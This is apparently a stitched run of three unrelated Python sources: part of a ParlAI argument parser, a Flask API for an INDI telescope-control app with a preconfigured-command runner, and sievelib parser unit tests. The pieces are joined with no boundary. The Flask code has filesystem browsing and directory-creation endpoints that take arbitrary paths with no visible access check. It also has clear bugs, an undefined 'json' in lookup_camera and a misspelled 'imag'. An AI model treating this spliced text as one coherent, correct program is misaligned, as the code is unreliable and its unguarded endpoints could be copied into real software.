            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. "babi:Task1" or "babi,cbt"')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add ":stream" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is "raw". set to "none" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """Add arguments related to models such as model files."""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """Add arguments specific to a particular model."""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """Add arguments specific to the specified task."""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """Add additional arguments for handling images."""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """Add more args depending on how known args are set."""
        parsed = vars(self.parse_known_args(nohelp=True)[0])                    

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """Custom parse known args to ignore help flag."""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """Print out all the arguments in this parser."""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """Set overridable kwargs."""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v

from .model import random_id
import subprocess
import json
import os
from .settings import settings
from .exceptions import NotFoundError, BadRequestError

class Command:
    def __init__(self, obj, readonly=False):
        self.id = random_id(obj.get('id'))
        self.name = obj['name']
        self.category = obj.get('category', 'Misc')
        self.program = obj['program']
        self.arguments = obj.get('arguments', [])
        self.readonly = readonly
        self.ui_properties = obj.get('ui_properties', None)

    def to_map(self):
        return {
            'id': self.id,
            'name': self.name,
            'category': self.category,
            'program': self.program,
            'arguments': self.arguments,
            'readonly': self.readonly,
            'ui_properties': self.ui_properties,
        }

    def run(self):                    
        args = [self.program]
        args.extend(self.arguments)
        result = subprocess.run(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)                    
        return {
            'exit_code': result.returncode,
            'stdout': result.stdout.decode() if result.stdout else None,
            'stderr': result.stderr.decode() if result.stderr else None,
        }
    

class Commands:
    def __init__(self):
        commands = []
        ro_commands_file = os.path.join(settings.config_dir, 'commands.json')
        if os.path.isfile(ro_commands_file):
            with open(ro_commands_file, 'r') as json_commands_file:
                commands.extend(json.load(json_commands_file))
        self.commands = [Command(c, readonly=True) for c in commands]

    def to_map(self):
        return [c.to_map() for c in self.commands]

    def run(self, command_id):                    
        commands = [c for c in self.commands if c.id == command_id]
        if not commands:
            raise NotFoundError('Command with id {} not found'.format(command_id))

        command = commands[0]
        return command.run()                    

commands = Commands()


from flask import jsonify, Response, send_from_directory, request
from api_decorators import *
from api_utils import *
from models import Server, Sequence, SequenceItem, NotFoundError, Property, Device, INDIProfile, ImagesDatabase, camera_images_db, main_images_db, commands
import os
from controller import controller
from app import app
import logging
import io

default_settings = {}

gunicorn_logger = logging.getLogger('gunicorn.error')
app.logger.handlers = gunicorn_logger.handlers

is_debug_mode = int(os.environ.get('DEV_MODE', '0')) == 1
app.logger.setLevel(os.environ.get('LOG_LEVEL', 'DEBUG' if is_debug_mode else 'INFO' ))

@app.route('/api/version')
@json_api
def backend_version():
    return app.config['version']

@app.route('/api/events')
def events():
    return Response(controller.sse.subscribe().feed(), mimetype='text/event-stream')

@app.route('/api/settings', methods=['GET'])
@json_api
def get_settings():
    return controller.settings.to_map()

@app.route('/api/settings', methods=['PUT'])
@json_input
@json_api
def update_settings(json):
    controller.settings.update(json)
    updated_settings = controller.settings.to_map()
    return dict([setting for setting in updated_settings.items() if setting[0] in json])

# INDI Server management

@app.route('/api/indi_service/status', methods=['GET'])
@json_api
def get_indi_service_status():
    return controller.indi_service.status()


@app.route('/api/indi_service', methods=['GET'])
@json_api
def get_indi_service():
    return controller.indi_service.to_map()


@app.route('/api/indi_service/start', methods=['POST'])
@json_input
@json_api
def start_indi_service(json):
    try:
        controller.indi_service.start(json['devices'])
        return { 'indi_service': 'starting' }
    except RuntimeError as e:
        raise BadRequestError(str(e))


@app.route('/api/indi_service/stop', methods=['POST'])
@json_api
def stop_indi_service():
    controller.indi_service.stop()
    return { 'indi_service': 'stopping' }

## INDI Profiles
@app.route('/api/indi_profiles', methods=['GET'])
@json_api
def get_indi_profiles():
    return [x.to_map() for x in controller.indi_profiles]


@app.route('/api/indi_profiles/<id>', methods=['GET'])
@json_api
def get_indi_profile(id):
    return controller.indi_profiles.lookup(id).to_map()


@app.route('/api/indi_profiles/<id>', methods=['DELETE'])
@json_api
def delete_indi_profile(id):
    indi_profile = controller.indi_profiles.lookup(id)
    indi_profile_json = indi_profile.to_map()
    indi_profile_json.update({'status': 'deleted'})
    controller.indi_profiles.remove(indi_profile)
    return indi_profile_json


@app.route('/api/indi_profiles', methods=['POST'])
@json_input
@json_api
def new_indi_profile(json):
    try:
        new_indi_profile = INDIProfile(name=json['name'], devices=json['devices'])
        controller.indi_profiles.append(new_indi_profile)
        return new_indi_profile.to_map()
    except KeyError:
        raise BadRequestError('Invalid json')

@app.route('/api/indi_profiles/<id>', methods=['PUT'])
@json_input
@json_api
def update_indi_profile(id, json):
    updated_profile = None
    with controller.indi_profiles.lookup_edit(id) as profile:
        profile.update(json)
        updated_profile = profile.to_map()
    return updated_profile

# INDI Methods

@app.route('/api/server/status', methods=['GET'])
@json_api
def get_server_status():
    return controller.indi_server.to_map()


@app.route('/api/server/connect', methods=['PUT'])
@json_api
def connect_server():
    controller.indi_server.connect()
    is_error = not timeout(5)(controller.indi_server.is_connected)()
    return notify('indi_server', 'indi_server_connect', controller.indi_server.to_map(), is_error)

@app.route('/api/server/disconnect', methods=['PUT'])
@json_api
@indi_connected
def disconnect_server():
    controller.indi_server.disconnect()
    is_error = not timeout(5)(lambda: not controller.indi_server.is_connected())()
    return notify('indi_server', 'indi_server_disconnect', controller.indi_server.to_map(), is_error)


@app.route('/api/server/devices', methods=['GET'])
@json_api
@indi_connected
def get_devices():
    return [x.to_map() for x in controller.indi_server.devices()]


@app.route('/api/server/devices/<name>/properties', methods=['GET'])
@json_api
@indi_connected
def get_device_properties(name):
    device = controller.indi_server.device(name=name)
    return [p.to_map() for p in device.properties()]


@app.route('/api/server/devices/<device>/properties/<property_name>', methods=['PUT'])
@json_input
@json_api
@indi_connected
def update_indi_property(device, property_name, json):
    app.logger.debug('update property: {}/{} ({})'.format(device, property_name, json))
    indi_property = controller.indi_server.property(device=device, name=property_name)
    return { 'action': 'set_property', 'device': device, 'property': property_name, 'values': json, 'result': indi_property.set_values(json) }



@app.route('/api/filter_wheels', methods=['GET'])
@json_api
@indi_connected
def get_filter_wheels():
    return [x.to_map() for x in controller.indi_server.filter_wheels()]

# Sequences

@app.route('/api/sequences', methods=['GET'])
@json_api
def get_sequences():
    return [x.to_map() for x in controller.sequences]


@app.route('/api/sequences/<id>', methods=['GET'])
@json_api
def get_sequence(id):
    return controller.sequences.lookup(id).to_map()


# TODO: cleanup all resources, such as sequence items and images
@app.route('/api/sequences/<id>', methods=['DELETE'])
@json_api
def delete_sequence(id):
    sequence = controller.sequences.lookup(id)
    sequence_json = sequence.to_map()
    sequence_json.update({'status': 'deleted'})
    controller.sequences.remove(sequence)
    return sequence_json


@app.route('/api/sequences', methods=['POST'])
@json_input
@json_api
def new_sequence(json):
    try:
        new_sequence = Sequence(json['name'], json['directory'], json['camera'], json.get('filterWheel'))
        controller.sequences.append(new_sequence)
        return new_sequence.to_map()
    except KeyError:
        raise BadRequestError('Invalid json')


@app.route('/api/sequences/<id>/start', methods=['POST'])
@json_api
def start_sequence(id):
    controller.sequences_runner.run(id)
    return controller.sequences.lookup(id).to_map()


@app.route('/api/sequences/<id>/duplicate', methods=['POST'])
@json_api
def duplicate_sequence(id):
    return controller.sequences.duplicate(id).to_map()


# Sequence Items

@app.route('/api/sequences/<id>/sequence_items', methods=['POST'])
@json_input
@json_api
def add_sequence_item(id, json):
    new_sequence_item = SequenceItem(json)
    with controller.sequences.lookup_edit(id) as sequence:
        app.logger.debug('adding sequence item {} to id {}'.format(new_sequence_item, id))
        sequence.sequence_items.append(new_sequence_item)
    return new_sequence_item.to_map()


@app.route('/api/sequences/<sequence_id>/sequence_items/<sequence_item_id>', methods=['PUT'])
@json_input
@json_api
def update_sequence_item(sequence_id, sequence_item_id, json):
    app.logger.debug('modifying sequence item {} from sequence'.format(sequence_item_id, sequence_id))
    new_sequence_item = SequenceItem(json)
    with controller.sequences.lookup_edit(sequence_id) as sequence:
        sequence.sequence_items = [new_sequence_item if x.id == sequence_item_id else x for x in sequence.sequence_items]
    return new_sequence_item.to_map()


@app.route('/api/sequences/<sequence_id>/sequence_items/<sequence_item_id>/move', methods=['PUT'])
@json_input
@json_api
def move_sequence_item(sequence_id, sequence_item_id, json):
    app.logger.debug('moving sequence item {}: direction: {}'.format(sequence_item_id, json['direction']))
    with controller.sequences.lookup_edit(sequence_id) as sequence:
        index = [ index for index, item in enumerate(sequence.sequence_items) if item.id == sequence_item_id]
        if not index:
            raise NotFoundError('Sequence item {} not found in sequence {}'.format(sequence_item_id, sequence_id))
        index = index[0]
        new_index = index-1 if json['direction'] == 'up' else index+1
        if new_index >= 0 and new_index < len(sequence.sequence_items):
            sequence.sequence_items.insert(new_index, sequence.sequence_items.pop(index))
        return sequence.to_map()



@app.route('/api/sequences/<sequence_id>/sequence_items/<sequence_item_id>/duplicate', methods=['PUT'])
@json_api
def duplicate_sequence_item(sequence_id, sequence_item_id):
    app.logger.debug('duplicate item {}'.format(sequence_item_id))
    with controller.sequences.lookup_edit(sequence_id) as sequence:
        sequence_item = sequence.item(sequence_item_id)
        sequence.sequence_items.append(sequence_item.duplicate())
        return sequence.to_map()




@app.route('/api/sequences/<sequence_id>/sequence_items/<sequence_item_id>', methods=['DELETE'])
@json_api
def delete_sequence_item(sequence_id, sequence_item_id):
    with controller.sequences.lookup_edit(sequence_id) as sequence:
        sequence_item = sequence.item(sequence_item_id)
        sequence_item = sequence_item.to_map()
        sequence_item.update({'status': 'deleted'})
        sequence.sequence_items = [x for x in sequence.sequence_items if x.id != sequence_item_id]
        return sequence_item

#imaging module


@app.route('/api/cameras', methods=['GET'])
@json_api
@indi_connected
def get_cameras():
    return [x.to_map() for x in controller.indi_server.cameras()]


def lookup_camera(id):
    camera = [c for c in controller.indi_server.cameras() if c.id == id]
    if not camera:
        raise NotFoundError('Camera {} not found'.format(json['camera']))
    return camera[0]


@app.route('/api/cameras/<camera>/image', methods=['POST'])
@json_input
@json_api
@indi_connected
def shoot_image(camera, json):
    return lookup_camera(camera).shoot_image(json)


def get_image_database(type):
    image_databases = {
        'camera': camera_images_db,
        'main': main_images_db,
    }
    if not type in image_databases:
        raise BadRequestError('Image type {} not recognized'.format(type))
    return image_databases[type]

@app.route('/api/images/<type>/<image>/wait_until_ready', methods=['GET'])
@json_api
def wait_for_image(type, image):
    get_image_database(type).lookup(image, file_required=False).wait_until_ready()
    return { 'ready': True }

@app.route('/api/images/<type>/<image>/ready', methods=['GET'])
@json_api
def image_is_ready(type, image):
    if get_image_database(type).lookup(image, file_required=False).is_ready():
        return { 'ready': True }
    else:
        raise NotFoundError('Image with type {} and id {} not found'.format(type, imag))


@app.route('/api/images/<type>', methods=['GET'])
@json_api
def retrieve_images(type):
    return get_image_database(type).to_map()

@app.route('/api/images/<type>/<image>', methods=['GET'])
@managed_api
def retrieve_image(type, image):
    with get_image_database(type).lookup_edit(image) as image:
        image_info = image.convert(request.args)
        return send_from_directory(
            image_info['directory'],
            image_info['filename'],
            mimetype=image_info['content_type'],
            as_attachment=request.args.get('download') == 'true',
            attachment_filename=image_info['filename'],
        )


@app.route('/api/images/<type>/<image>/histogram', methods=['GET'])
@json_api
def retrieve_image_histogram(type, image):
    image = get_image_database(type).lookup(image)
    args = {}
    if 'bins' in request.args:
        args['bins'] = request.args['bins']
    return image.histogram(**args)


# filesystem
@app.route('/api/mkdir', methods=['POST'])
@json_input
@json_api
def browser_mkdir(json):
    try:
        path = json['path'] if 'path' in json else os.path.join(json['parent'], json['name'])
        os.makedirs(path)
        return {
            'parent': os.path.dirname(path),
            'name': os.path.basename(path),
            'path': path,
            'created': True,
        }
    except KeyError:
        raise BadRequestError('Invalid json')
    except Exception as e:
        raise BadRequestError(str(e))

@app.route('/api/directory_browser', methods=['GET'])
@json_api
def directory_browser():
    path=request.args.get('path', '/')
    if not os.path.exists(path):
        parent_dir = path
        while not os.path.isdir(parent_dir):
            parent_dir = os.path.dirname(parent_dir)
        raise NotFoundError("Directory {} doesn't exists".format(path), payload={ 'requested_path': path, 'redirect_to': parent_dir })

    if not os.path.isdir(path):
        raise BadRequestError('Path {} is not a directory'.format(path))

    entries = sorted(os.listdir(path))

    subdirectories = [dir for dir in entries if os.path.isdir(os.path.join(path, dir))]
    parent = os.path.dirname(path)
    response = {
        'path': os.path.normpath(path),
        'subdirectories': subdirectories,
        'parent': os.path.normpath(parent) if parent != path else None,
    }
    if request.args.get('show_files', 'false') == 'true':
        response['files'] = [dir for dir in entries if os.path.isfile(os.path.join(path, dir))]
    return response

# Run commands
@app.route('/api/commands', methods=['GET'])
@json_api
def get_available_commands():
    return commands.to_map()

@app.route('/api/commands/<id>/run', methods=['POST'])
@json_api
def run_command(id):                    
    return commands.run(id)                    


# coding: utf-8

"""
Unit tests for the SIEVE language parser.
"""
from sievelib.parser import Parser
import sievelib.commands
import unittest
import cStringIO


class MytestCommand(sievelib.commands.ActionCommand):
    args_definition = [
        {"name" : "testtag",
         "type" : ["tag"],
         "write_tag": True,
         "values" : [":testtag"],
         "extra_arg" : {"type" : "number",
                        "required": False},
         "required" : False},
        {"name" : "recipients",
         "type" : ["string", "stringlist"],
         "required" : True}
    ]



class SieveTest(unittest.TestCase):
    def setUp(self):
        self.parser = Parser()

    def __checkCompilation(self, script, result):
        self.assertEqual(self.parser.parse(script), result)

    def compilation_ok(self, script):
        self.__checkCompilation(script, True)

    def compilation_ko(self, script):
        self.__checkCompilation(script, False)

    def representation_is(self, content):
        target = cStringIO.StringIO()
        self.parser.dump(target)
        repr_ = target.getvalue()
        target.close()
        self.assertEqual(repr_, content.lstrip())


class AdditionalCommands(SieveTest):

    def test_add_command(self):
        sievelib.commands.add_commands(MytestCommand)
        sievelib.commands.get_command_instance('mytest')
        self.assertRaises(sievelib.commands.UnknownCommand, sievelib.commands.get_command_instance, 'unknowncommand')                    
        self.compilation_ok("""
        mytest :testtag 10 ["testrecp1@example.com"];
        """)
        

class ValidSyntaxes(SieveTest):

    def test_hash_comment(self):
        self.compilation_ok("""
if size :over 100k { # this is a comment
    discard;
}
""")
        self.representation_is("""
if (type: control)
    size (type: test)
        :over
        100k
    discard (type: action)
""")

    def test_bracket_comment(self):
        self.compilation_ok("""
if size :over 100K { /* this is a comment
    this is still a comment */ discard /* this is a comment
    */ ;
}
""")
        self.representation_is("""
if (type: control)
    size (type: test)
        :over
        100K
    discard (type: action)
""")
        
    def test_string_with_bracket_comment(self):
        self.compilation_ok("""
if header :contains "Cc" "/* comment */" {
    discard;
}
""")
        self.representation_is("""
if (type: control)
    header (type: test)
        :contains
        "Cc"
        "/* comment */"
    discard (type: action)
""")

    def test_multiline_string(self):
        self.compilation_ok("""
require "reject";

if allof (false, address :is ["From", "Sender"] ["blka@bla.com"]) {
    reject text:
noreply
============================
Your email has been canceled
============================
.
;
    stop;
} else {
    reject text:
================================
Your email has been canceled too
================================
.
;
}
""")
        self.representation_is("""
require (type: control)
    "reject"
if (type: control)
    allof (type: test)
        false (type: test)
        address (type: test)
            :is
            ["From","Sender"]
            ["blka@bla.com"]
    reject (type: action)
        text:
noreply
============================
Your email has been canceled
============================
.
    stop (type: control)
else (type: control)
    reject (type: action)
        text:
================================
Your email has been canceled too
================================
.
""")

    def test_nested_blocks(self):
        self.compilation_ok("""
if header :contains "Sender" "example.com" {
  if header :contains "Sender" "me@" {
    discard;
  } elsif header :contains "Sender" "you@" {
    keep;
  }
}
""")
        self.representation_is("""
if (type: control)
    header (type: test)
        :contains
        "Sender"
        "example.com"
    if (type: control)
        header (type: test)
            :contains
            "Sender"
            "me@"
        discard (type: action)
    elsif (type: control)
        header (type: test)
            :contains
            "Sender"
            "you@"
        keep (type: action)
""")

    def test_true_test(self):
        self.compilation_ok("""
if true {

}
""")
        self.representation_is("""
if (type: control)
    true (type: test)
""")

    def test_rfc5228_extended(self):
        self.compilation_ok("""
#
# Example Sieve Filter
# Declare any optional features or extension used by the script
#
require ["fileinto"];

#
# Handle messages from known mailing lists
# Move messages from IETF filter discussion list to filter mailbox
#
if header :is "Sender" "owner-ietf-mta-filters@imc.org"
        {
        fileinto "filter";  # move to "filter" mailbox
        }
#
# Keep all messages to or from people in my company
#
elsif address :DOMAIN :is ["From", "To"] "example.com"
        {
        keep;               # keep in "In" mailbox
        }

#
# Try and catch unsolicited email.  If a message is not to me,
# or it contains a subject known to be spam, file it away.
#
elsif anyof (NOT address :all :contains
               ["To", "Cc", "Bcc"] "me@example.com",
             header :matches "subject"
               ["*make*money*fast*", "*university*dipl*mas*"])
        {
        fileinto "spam";   # move to "spam" mailbox
        }
else
        {
        # Move all other (non-company) mail to "personal"
        # mailbox.
        fileinto "personal";
        }
""")
        self.representation_is("""
require (type: control)
    ["fileinto"]
if (type: control)
    header (type: test)
        :is
        "Sender"
        "owner-ietf-mta-filters@imc.org"
    fileinto (type: action)
        "filter"
elsif (type: control)
    address (type: test)
        :DOMAIN
        :is
        ["From","To"]
        "example.com"
    keep (type: action)
elsif (type: control)
    anyof (type: test)
        not (type: test)
            address (type: test)
                :all
                :contains
                ["To","Cc","Bcc"]
                "me@example.com"
        header (type: test)
            :matches
            "subject"
            ["*make*money*fast*","*university*dipl*mas*"]
    fileinto (type: action)
        "spam"
else (type: control)
    fileinto (type: action)
        "personal"
""")

    def test_explicit_comparator(self):
        self.compilation_ok("""
if header :contains :comparator "i;octet" "Subject" "MAKE MONEY FAST" {
  discard;
}
""")
        self.representation_is("""
if (type: control)
    header (type: test)
        "i;octet"
        :contains
        "Subject"
        "MAKE MONEY FAST"
    discard (type: action)
""")

    def test_non_ordered_args(self):
        self.compilation_ok("""
if address :all :is "from" "tim@example.com" {
    discard;
}
""")
        self.representation_is("""
if (type: control)
    address (type: test)
        :all
        :is
        "from"
        "tim@example.com"
    discard (type: action)
""")

    def test_multiple_not(self):
        self.compilation_ok("""
if not not not not true {
    stop;
}
""")
        self.representation_is("""
if (type: control)
    not (type: test)
        not (type: test)
            not (type: test)
                not (type: test)
                    true (type: test)
    stop (type: control)
""")

    def test_just_one_command(self):
        self.compilation_ok("keep;")
        self.representation_is("""
keep (type: action)
""")

    def test_singletest_testlist(self):
        self.compilation_ok("""
if anyof (true) {
    discard;
}
""")
        self.representation_is("""
if (type: control)
    anyof (type: test)
        true (type: test)
    discard (type: action)
""")

    def test_truefalse_testlist(self):
        self.compilation_ok("""
if anyof(true, false) {
    discard;
}
""")
        self.representation_is("""
if (type: control)
    anyof (type: test)
        true (type: test)
        false (type: test)
    discard (type: action)
""")

    def test_vacationext_basic(self):
        self.compilation_ok("""
require "vacation";
if header :contains "subject" "cyrus" {
    vacation "I'm out -- send mail to cyrus-bugs";
} else {
    vacation "I'm out -- call me at +1 304 555 0123";
}
""")

    def test_vacationext_medium(self):
        self.compilation_ok("""
require "vacation";
if header :contains "subject" "lunch" {
    vacation :handle "ran-away" "I'm out and can't meet for lunch";
} else {
    vacation :handle "ran-away" "I'm out";
}
""")

    def test_vacationext_with_limit(self):
        self.compilation_ok("""
require "vacation";
vacation :days 23 :addresses ["tjs@example.edu",
                              "ts4z@landru.example.edu"]
   "I'm away until October 19.
   If it's an emergency, call 911, I guess." ;
""")

    def test_vacationext_with_multiline(self):
        self.compilation_ok("""
require "vacation";
vacation :mime text:
Content-Type: multipart/alternative; boundary=foo

--foo

I'm at the beach relaxing.  Mmmm, surf...

--foo
Content-Type: text/html; charset=us-ascii

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN"
 "http://www.w3.org/TR/REC-html40/strict.dtd">
<HTML><HEAD><TITLE>How to relax</TITLE>
<BASE HREF="http://home.example.com/pictures/"></HEAD>
<BODY><P>I'm at the <A HREF="beach.gif">beach</A> relaxing.
Mmmm, <A HREF="ocean.gif">surf</A>...
</BODY></HTML>

--foo--
.
;
""")

    def test_reject_extension(self):
        self.compilation_ok("""
require "reject";

if header :contains "subject" "viagra" {
    reject;
}
""")

class InvalidSyntaxes(SieveTest):

    def test_nested_comments(self):
        self.compilation_ko("""
/* this is a comment /* with a nested comment inside */
it is allowed by the RFC :p */
""")

    def test_nonopened_block(self):
        self.compilation_ko("""
if header :is "Sender" "me@example.com" 
    discard;
}
""")

    def test_nonclosed_block(self):
        self.compilation_ko("""
if header :is "Sender" "me@example.com" {
    discard;

""")

    def test_unknown_token(self):
        self.compilation_ko("""
if header :is "Sender" "Toto" & header :contains "Cc" "Tata" {
    
}
""")

    def test_empty_string_list(self):
        self.compilation_ko("require [];")

    def test_unclosed_string_list(self):
        self.compilation_ko('require ["toto", "tata";')

    def test_misplaced_comma_in_string_list(self):
        self.compilation_ko('require ["toto",];')

    def test_nonopened_tests_list(self):
        self.compilation_ko("""
if anyof header :is "Sender" "me@example.com",
          header :is "Sender" "myself@example.com") {
    fileinto "trash";
}
""")

    def test_nonclosed_tests_list(self):
        self.compilation_ko("""
if anyof (header :is "Sender" "me@example.com",
          header :is "Sender" "myself@example.com" {
    fileinto "trash";
}
""")

    def test_nonclosed_tests_list2(self):
        self.compilation_ko("""
if anyof (header :is "Sender" {
    fileinto "trash";
}
""")

    def test_misplaced_comma_in_tests_list(self):
        self.compilation_ko("""
if anyof (header :is "Sender" "me@example.com",) {

}
""")

    def test_comma_inside_arguments(self):
        self.compilation_ko("""
require "fileinto", "enveloppe";
""")

    def test_non_ordered_args(self):
        self.compilation_ko("""
if address "From" :is "tim@example.com" {
    discard;
}
""")

    def test_extra_arg(self):
        self.compilation_ko("""
if address :is "From" "tim@example.com" "tutu" {
    discard;
}
""")

    def test_empty_not(self):
        self.compilation_ko("""
if not {
    discard;
}
""")

    def test_missing_semicolon(self):
        self.compilation_ko("""
require ["fileinto"]
""")

    def test_missing_semicolon_in_block(self):
        self.compilation_ko("""
if true {
    stop
}
""")

    def test_misplaced_parenthesis(self):
        self.compilation_ko("""
if (true) {

}
""")

class LanguageRestrictions(SieveTest):

    def test_unknown_control(self):
        self.compilation_ko("""
macommande "Toto";
""")

    def test_misplaced_elsif(self):
        self.compilation_ko("""
elsif true {

}
""")

    def test_misplaced_elsif2(self):
        self.compilation_ko("""
elsif header :is "From" "toto" {

}
""")

    def test_misplaced_nested_elsif(self):
        self.compilation_ko("""
if true {
  elsif false {

  }
}
""")

    def test_unexpected_argument(self):
        self.compilation_ko('stop "toto";')

    def test_bad_arg_value(self):
        self.compilation_ko("""
if header :isnot "Sent" "me@example.com" {
  stop;
}
""")

    def test_bad_arg_value2(self):
        self.compilation_ko("""
if header :isnot "Sent" 10000 {
  stop;
}
""")

    def test_bad_comparator_value(self):
        self.compilation_ko("""
if header :contains :comparator "i;prout" "Subject" "MAKE MONEY FAST" {
  discard;
}
""")

    def test_not_included_extension(self):
        self.compilation_ko("""
if header :contains "Subject" "MAKE MONEY FAST" {
  fileinto "spam";
}
""")

    def test_test_outside_control(self):
        self.compilation_ko("true;")
